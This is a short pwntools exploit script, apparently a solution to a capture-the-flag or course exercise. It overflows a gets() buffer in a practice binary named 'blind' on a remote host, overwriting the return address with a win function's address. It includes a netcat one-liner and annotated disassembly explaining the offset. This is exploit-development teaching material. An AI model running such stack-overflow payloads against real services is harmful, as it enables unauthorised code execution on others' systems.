from pwn import *

p = remote('plsdonthaq.me', 2002)
#p = process('./blind')
p.recvline()

# 68 is the offset of buffer address from ebp
# 4 is to account for old ebp value that was pushed on the stack
# so we overwrite eip after padding 72 bytes
padding = b'A'*(68 + 4)
win_addr = p32(0x080484d6)
payload = padding + win_addr

p.sendline(payload)
p.interactive()

# the one-liner equivalent:
# (python -c "print 'A'*72 + '\xd6\x84\x04\x08'"; cat) | nc plsdonthaq.me 2002

'''
080484d6 <win>:

080484fb <vuln>:
 80484fb:       55                      push   ebp
 80484fc:       89 e5                   mov    ebp,esp

 804852f:       8d 45 bc                lea    eax,[ebp-0x44]
 8048532:       50                      push   eax
 8048533:       e8 38 fe ff ff          call   8048370 <gets@plt>

 804853f:       c9                      leave  
 8048540:       c3                      ret 

leave:
	mov		esp, ebp
	pop		ebp

ret:
	pop		eip
'''